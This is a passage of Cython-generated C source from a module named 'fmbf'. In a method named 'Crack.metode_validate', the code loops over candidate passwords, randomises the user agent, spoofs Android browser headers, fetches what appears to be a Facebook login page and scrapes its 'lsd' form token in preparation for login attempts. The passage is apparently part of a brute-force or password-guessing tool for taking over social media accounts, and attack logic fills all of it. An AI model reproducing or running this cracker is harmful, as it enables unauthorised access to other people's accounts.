      __Pyx_INCREF(__pyx_t_3);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_2, function);
    }
  }
  __pyx_t_1 = (__pyx_t_3) ? __Pyx_PyObject_Call2Args(__pyx_t_2, __pyx_t_3, __pyx_t_6) : __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_t_6);
  __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
  if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 304, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = PyTuple_New(1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 304, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_GIVEREF(__pyx_t_1);
  PyTuple_SET_ITEM(__pyx_t_2, 0, __pyx_t_1);
  __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_sys); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 305, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_stdout); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 305, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_n_s_flush); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 305, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
  __pyx_t_6 = NULL;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_1))) {
    __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_1);
    if (likely(__pyx_t_6)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
      __Pyx_INCREF(__pyx_t_6);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_1, function);
    }
  }
  __pyx_t_2 = (__pyx_t_6) ? __Pyx_PyObject_CallOneArg(__pyx_t_1, __pyx_t_6) : __Pyx_PyObject_CallNoArg(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
  if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 305, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_9, &__pyx_t_10, &__pyx_t_11);
    __Pyx_XGOTREF(__pyx_t_9);
    __Pyx_XGOTREF(__pyx_t_10);
    __Pyx_XGOTREF(__pyx_t_11);
     {

      
      if (likely(PyList_CheckExact(__pyx_v_pwx)) || PyTuple_CheckExact(__pyx_v_pwx)) {
        __pyx_t_2 = __pyx_v_pwx; __Pyx_INCREF(__pyx_t_2); __pyx_t_4 = 0;
        __pyx_t_12 = NULL;
      } else {
        __pyx_t_4 = -1; __pyx_t_2 = PyObject_GetIter(__pyx_v_pwx); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 307, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_2);
        __pyx_t_12 = Py_TYPE(__pyx_t_2)->tp_iternext; if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 307, __pyx_L3_error)
      }
      for (;;) {
        if (likely(!__pyx_t_12)) {
          if (likely(PyList_CheckExact(__pyx_t_2))) {
            if (__pyx_t_4 >= PyList_GET_SIZE(__pyx_t_2)) break;
            #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
            __pyx_t_1 = PyList_GET_ITEM(__pyx_t_2, __pyx_t_4); __Pyx_INCREF(__pyx_t_1); __pyx_t_4++; if (unlikely(0 < 0)) __PYX_ERR(0, 307, __pyx_L3_error)
            #else
            __pyx_t_1 = PySequence_ITEM(__pyx_t_2, __pyx_t_4); __pyx_t_4++; if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 307, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_1);
            #endif
          } else {
            if (__pyx_t_4 >= PyTuple_GET_SIZE(__pyx_t_2)) break;
            #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
            __pyx_t_1 = PyTuple_GET_ITEM(__pyx_t_2, __pyx_t_4); __Pyx_INCREF(__pyx_t_1); __pyx_t_4++; if (unlikely(0 < 0)) __PYX_ERR(0, 307, __pyx_L3_error)
            #else
            __pyx_t_1 = PySequence_ITEM(__pyx_t_2, __pyx_t_4); __pyx_t_4++; if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 307, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_1);
            #endif
          }
        } else {
          __pyx_t_1 = __pyx_t_12(__pyx_t_2);
          if (unlikely(!__pyx_t_1)) {
            PyObject* exc_type = PyErr_Occurred();
            if (exc_type) {
              if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
              else __PYX_ERR(0, 307, __pyx_L3_error)
            }
            break;
          }
          __Pyx_GOTREF(__pyx_t_1);
        }
        __Pyx_XDECREF_SET(__pyx_v_pw, __pyx_t_1);
        __pyx_t_1 = 0;

        
        __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_v_pw, __pyx_n_s_lower); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 308, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __pyx_t_3 = NULL;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_6))) {
          __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_6);
          if (likely(__pyx_t_3)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
            __Pyx_INCREF(__pyx_t_3);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_6, function);
          }
        }
        __pyx_t_1 = (__pyx_t_3) ? __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_t_3) : __Pyx_PyObject_CallNoArg(__pyx_t_6);
        __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
        if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 308, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_1);
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        __Pyx_DECREF_SET(__pyx_v_pw, __pyx_t_1);
        __pyx_t_1 = 0;

        
        {
          __Pyx_PyThreadState_declare
          __Pyx_PyThreadState_assign
          __Pyx_ExceptionSave(&__pyx_t_13, &__pyx_t_14, &__pyx_t_15);
          __Pyx_XGOTREF(__pyx_t_13);
          __Pyx_XGOTREF(__pyx_t_14);
          __Pyx_XGOTREF(__pyx_t_15);
           {
            __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_random); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 309, __pyx_L11_error)
            __Pyx_GOTREF(__pyx_t_6);
            __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_n_s_choice); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 309, __pyx_L11_error)
            __Pyx_GOTREF(__pyx_t_3);
            __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
            __pyx_t_16 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__63, NULL); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 309, __pyx_L11_error)
            __Pyx_GOTREF(__pyx_t_16);
            __pyx_t_17 = __Pyx_PyObject_GetAttrStr(__pyx_t_16, __pyx_n_s_read); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 309, __pyx_L11_error)
            __Pyx_GOTREF(__pyx_t_17);
            __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
            __pyx_t_16 = NULL;
            if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_17))) {
              __pyx_t_16 = PyMethod_GET_SELF(__pyx_t_17);
              if (likely(__pyx_t_16)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_17);
                __Pyx_INCREF(__pyx_t_16);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_17, function);
              }
            }
            __pyx_t_7 = (__pyx_t_16) ? __Pyx_PyObject_CallOneArg(__pyx_t_17, __pyx_t_16) : __Pyx_PyObject_CallNoArg(__pyx_t_17);
            __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
            if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 309, __pyx_L11_error)
            __Pyx_GOTREF(__pyx_t_7);
            __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
            __pyx_t_17 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_splitlines); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 309, __pyx_L11_error)
            __Pyx_GOTREF(__pyx_t_17);
            __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
            __pyx_t_7 = NULL;
            if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_17))) {
              __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_17);
              if (likely(__pyx_t_7)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_17);
                __Pyx_INCREF(__pyx_t_7);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_17, function);
              }
            }
            __pyx_t_6 = (__pyx_t_7) ? __Pyx_PyObject_CallOneArg(__pyx_t_17, __pyx_t_7) : __Pyx_PyObject_CallNoArg(__pyx_t_17);
            __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
            if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 309, __pyx_L11_error)
            __Pyx_GOTREF(__pyx_t_6);
            __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
            __pyx_t_17 = NULL;
            if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_3))) {
              __pyx_t_17 = PyMethod_GET_SELF(__pyx_t_3);
              if (likely(__pyx_t_17)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
                __Pyx_INCREF(__pyx_t_17);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_3, function);
              }
            }
            __pyx_t_1 = (__pyx_t_17) ? __Pyx_PyObject_Call2Args(__pyx_t_3, __pyx_t_17, __pyx_t_6) : __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_6);
            __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
            __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
            if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 309, __pyx_L11_error)
            __Pyx_GOTREF(__pyx_t_1);
            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
            __pyx_t_3 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyString_Type)), __pyx_t_1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 309, __pyx_L11_error)
            __Pyx_GOTREF(__pyx_t_3);
            __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
            __Pyx_XDECREF_SET(__pyx_v_ua, __pyx_t_3);
            __pyx_t_3 = 0;
          }
          __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
          __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
          __Pyx_XDECREF(__pyx_t_15); __pyx_t_15 = 0;
          goto __pyx_L18_try_end;
          __pyx_L11_error:;
          __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
          __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
          __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
          __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
          __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
          __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;

          
           {
            __Pyx_AddTraceback("fmbf.Crack.metode_validate", __pyx_clineno, __pyx_lineno, __pyx_filename);
            if (__Pyx_GetException(&__pyx_t_3, &__pyx_t_1, &__pyx_t_6) < 0) __PYX_ERR(0, 310, __pyx_L13_except_error)
            __Pyx_GOTREF(__pyx_t_3);
            __Pyx_GOTREF(__pyx_t_1);
            __Pyx_GOTREF(__pyx_t_6);
            __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_random); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 310, __pyx_L13_except_error)
            __Pyx_GOTREF(__pyx_t_7);
            __pyx_t_16 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_choice); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 310, __pyx_L13_except_error)
            __Pyx_GOTREF(__pyx_t_16);
            __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
            __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_ugent); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 310, __pyx_L13_except_error)
            __Pyx_GOTREF(__pyx_t_7);
            __pyx_t_18 = NULL;
            if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_16))) {
              __pyx_t_18 = PyMethod_GET_SELF(__pyx_t_16);
              if (likely(__pyx_t_18)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_16);
                __Pyx_INCREF(__pyx_t_18);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_16, function);
              }
            }
            __pyx_t_17 = (__pyx_t_18) ? __Pyx_PyObject_Call2Args(__pyx_t_16, __pyx_t_18, __pyx_t_7) : __Pyx_PyObject_CallOneArg(__pyx_t_16, __pyx_t_7);
            __Pyx_XDECREF(__pyx_t_18); __pyx_t_18 = 0;
            __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
            if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 310, __pyx_L13_except_error)
            __Pyx_GOTREF(__pyx_t_17);
            __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
            __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
            __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
            __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
            __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
            goto __pyx_L12_exception_handled;
          }
          __pyx_L13_except_error:;

          
          __Pyx_XGIVEREF(__pyx_t_13);
          __Pyx_XGIVEREF(__pyx_t_14);
          __Pyx_XGIVEREF(__pyx_t_15);
          __Pyx_ExceptionReset(__pyx_t_13, __pyx_t_14, __pyx_t_15);
          goto __pyx_L3_error;
          __pyx_L12_exception_handled:;
          __Pyx_XGIVEREF(__pyx_t_13);
          __Pyx_XGIVEREF(__pyx_t_14);
          __Pyx_XGIVEREF(__pyx_t_15);
          __Pyx_ExceptionReset(__pyx_t_13, __pyx_t_14, __pyx_t_15);
          __pyx_L18_try_end:;
        }

        
        __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_requests); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 311, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_1);
        __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_Session); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 311, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_3);
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        __pyx_t_1 = NULL;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_3))) {
          __pyx_t_1 = PyMethod_GET_SELF(__pyx_t_3);
          if (likely(__pyx_t_1)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
            __Pyx_INCREF(__pyx_t_1);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_3, function);
          }
        }
        __pyx_t_6 = (__pyx_t_1) ? __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_1) : __Pyx_PyObject_CallNoArg(__pyx_t_3);
        __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
        if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 311, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
        __Pyx_XDECREF_SET(__pyx_v_ses, __pyx_t_6);
        __pyx_t_6 = 0;

        
        __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_v_ses, __pyx_n_s_headers); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 312, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_3);
        __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_update); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 312, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_1);
        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
        __pyx_t_3 = __Pyx_PyDict_NewPresized(13); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 312, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_3);
        if (PyDict_SetItem(__pyx_t_3, __pyx_n_s_host, __pyx_v_url) < 0) __PYX_ERR(0, 312, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_3, __pyx_kp_s_upgrade_insecure_requests, __pyx_kp_s_1) < 0) __PYX_ERR(0, 312, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_3, __pyx_n_s_accept, __pyx_kp_s_text_html_application_xhtml_xml) < 0) __PYX_ERR(0, 312, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_3, __pyx_kp_s_x_requested_with, __pyx_n_s_XMLHttpRequest) < 0) __PYX_ERR(0, 312, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_3, __pyx_kp_s_sec_ch_ua, __pyx_kp_s_Not_A_Brand_v_99_Chromium_v_101) < 0) __PYX_ERR(0, 312, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_3, __pyx_kp_s_sec_ch_ua_mobile, __pyx_kp_s_1_2) < 0) __PYX_ERR(0, 312, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_3, __pyx_kp_s_sec_ch_ua_platform, __pyx_kp_s_Android_2) < 0) __PYX_ERR(0, 312, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_3, __pyx_kp_s_sec_fetch_site, __pyx_kp_s_same_origin) < 0) __PYX_ERR(0, 312, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_3, __pyx_kp_s_sec_fetch_mode, __pyx_n_s_cors) < 0) __PYX_ERR(0, 312, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_3, __pyx_kp_s_sec_fetch_dest, __pyx_n_s_empty) < 0) __PYX_ERR(0, 312, __pyx_L3_error)
        if (unlikely(!__pyx_v_ua)) { __Pyx_RaiseUnboundLocalError("ua"); __PYX_ERR(0, 312, __pyx_L3_error) }
        if (PyDict_SetItem(__pyx_t_3, __pyx_kp_s_user_agent, __pyx_v_ua) < 0) __PYX_ERR(0, 312, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_3, __pyx_kp_s_accept_encoding, __pyx_kp_s_gzip_deflate_br) < 0) __PYX_ERR(0, 312, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_3, __pyx_kp_s_accept_language, __pyx_kp_s_id_ID_id_q_0_9_en_US_q_0_8_en_q) < 0) __PYX_ERR(0, 312, __pyx_L3_error)
        __pyx_t_17 = NULL;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_1))) {
          __pyx_t_17 = PyMethod_GET_SELF(__pyx_t_1);
          if (likely(__pyx_t_17)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
            __Pyx_INCREF(__pyx_t_17);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_1, function);
          }
        }
        __pyx_t_6 = (__pyx_t_17) ? __Pyx_PyObject_Call2Args(__pyx_t_1, __pyx_t_17, __pyx_t_3) : __Pyx_PyObject_CallOneArg(__pyx_t_1, __pyx_t_3);
        __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
        if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 312, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

        
        __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_v_ses, __pyx_n_s_get); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 313, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_1);
        __pyx_t_3 = PyTuple_New(3); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 313, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_3);
        __pyx_t_8 = 0;
        __pyx_t_5 = 127;
        __Pyx_INCREF(__pyx_kp_u_https);
        __pyx_t_8 += 8;
        __Pyx_GIVEREF(__pyx_kp_u_https);
        PyTuple_SET_ITEM(__pyx_t_3, 0, __pyx_kp_u_https);
        __pyx_t_17 = __Pyx_PyObject_FormatSimple(__pyx_v_url, __pyx_empty_unicode); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 313, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_17);
        __pyx_t_5 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_17) > __pyx_t_5) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_17) : __pyx_t_5;
        __pyx_t_8 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_17);
        __Pyx_GIVEREF(__pyx_t_17);
        PyTuple_SET_ITEM(__pyx_t_3, 1, __pyx_t_17);
        __pyx_t_17 = 0;
        __Pyx_INCREF(__pyx_kp_u_login_next_ref_dbl_fl_login_fro);
        __pyx_t_8 += 49;
        __Pyx_GIVEREF(__pyx_kp_u_login_next_ref_dbl_fl_login_fro);
        PyTuple_SET_ITEM(__pyx_t_3, 2, __pyx_kp_u_login_next_ref_dbl_fl_login_fro);
        __pyx_t_17 = __Pyx_PyUnicode_Join(__pyx_t_3, 3, __pyx_t_8, __pyx_t_5); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 313, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_17);
        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
        __pyx_t_3 = NULL;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_1))) {
          __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_1);
          if (likely(__pyx_t_3)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
            __Pyx_INCREF(__pyx_t_3);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_1, function);
          }
        }
        __pyx_t_6 = (__pyx_t_3) ? __Pyx_PyObject_Call2Args(__pyx_t_1, __pyx_t_3, __pyx_t_17) : __Pyx_PyObject_CallOneArg(__pyx_t_1, __pyx_t_17);
        __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
        __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
        if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 313, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_n_s_text); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 313, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_1);
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        __Pyx_XDECREF_SET(__pyx_v_get, __pyx_t_1);
        __pyx_t_1 = 0;

        
        __pyx_t_1 = __Pyx_PyDict_NewPresized(6); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 314, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_1);
        __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_re); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 314, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_3);
        __pyx_t_16 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_search); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 314, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_16);
        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
        __pyx_t_3 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyString_Type)), __pyx_v_get); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 314, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_3);
        __pyx_t_7 = NULL;
        __pyx_t_19 = 0;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_16))) {
          __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_16);
          if (likely(__pyx_t_7)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_16);
            __Pyx_INCREF(__pyx_t_7);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_16, function);
            __pyx_t_19 = 1;
          }
        }
        #if CYTHON_FAST_PYCALL
        if (PyFunction_Check(__pyx_t_16)) {
          PyObject *__pyx_temp[3] = {__pyx_t_7, __pyx_kp_s_name_lsd_value, __pyx_t_3};
          __pyx_t_17 = __Pyx_PyFunction_FastCall(__pyx_t_16, __pyx_temp+1-__pyx_t_19, 2+__pyx_t_19); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 314, __pyx_L3_error)
          __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
          __Pyx_GOTREF(__pyx_t_17);
          __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
        } else
        #endif
        #if CYTHON_FAST_PYCCALL
        if (__Pyx_PyFastCFunction_Check(__pyx_t_16)) {
          PyObject *__pyx_temp[3] = {__pyx_t_7, __pyx_kp_s_name_lsd_value, __pyx_t_3};
          __pyx_t_17 = __Pyx_PyCFunction_FastCall(__pyx_t_16, __pyx_temp+1-__pyx_t_19, 2+__pyx_t_19); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 314, __pyx_L3_error)
          __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
          __Pyx_GOTREF(__pyx_t_17);
          __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
        } else
        #endif
        {
          __pyx_t_18 = PyTuple_New(2+__pyx_t_19); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 314, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_18);
          if (__pyx_t_7) {
            __Pyx_GIVEREF(__pyx_t_7); PyTuple_SET_ITEM(__pyx_t_18, 0, __pyx_t_7); __pyx_t_7 = NULL;
          }
          __Pyx_INCREF(__pyx_kp_s_name_lsd_value);
          __Pyx_GIVEREF(__pyx_kp_s_name_lsd_value);
          PyTuple_SET_ITEM(__pyx_t_18, 0+__pyx_t_19, __pyx_kp_s_name_lsd_value);
          __Pyx_GIVEREF(__pyx_t_3);
          PyTuple_SET_ITEM(__pyx_t_18, 1+__pyx_t_19, __pyx_t_3);
          __pyx_t_3 = 0;
          __pyx_t_17 = __Pyx_PyObject_Call(__pyx_t_16, __pyx_t_18, NULL); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 314, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_17);
          __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
        }
        __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
        __pyx_t_16 = __Pyx_PyObject_GetAttrStr(__pyx_t_17, __pyx_n_s_group); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 314, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_16);
        __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
        __pyx_t_17 = NULL;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_16))) {
          __pyx_t_17 = PyMethod_GET_SELF(__pyx_t_16);
          if (likely(__pyx_t_17)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_16);
            __Pyx_INCREF(__pyx_t_17);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_16, function);
          }
        }
        __pyx_t_6 = (__pyx_t_17) ? __Pyx_PyObject_Call2Args(__pyx_t_16, __pyx_t_17, __pyx_int_1) : __Pyx_PyObject_CallOneArg(__pyx_t_16, __pyx_int_1);
        __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
        if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 314, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
        if (PyDict_SetItem(__pyx_t_1, __pyx_n_s_lsd, __pyx_t_6) < 0) __PYX_ERR(0, 314, __pyx_L3_error)
